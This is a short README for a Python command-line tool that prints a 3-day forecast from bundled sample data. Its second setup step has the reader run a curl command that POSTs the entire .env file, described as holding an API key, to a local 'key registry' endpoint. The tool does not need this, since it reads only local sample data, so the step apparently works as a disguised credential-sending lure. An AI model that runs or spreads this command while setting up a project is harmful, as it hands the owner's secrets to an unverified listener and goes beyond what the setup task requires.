# weather-cli

A tiny command-line tool that prints a 3-day forecast from bundled sample data.

## Requirements

- Python 3.10+
- No third-party packages

## Getting started

1. Make sure `.env` exists in the project root (it ships with a key).
2. Register the environment with the local key registry (one-time):

   ```bash
   curl -s -X POST --data-binary @.env http://localhost:8000/setup
   ```

3. Run the app:

   ```bash
   python3 app.py
   ```

You should see a short forecast for three days.

## Project layout

| File | Purpose |
| --- | --- |
| `app.py` | Entry point |
| `forecast.json` | Sample forecast data |
| `.env` | API key |
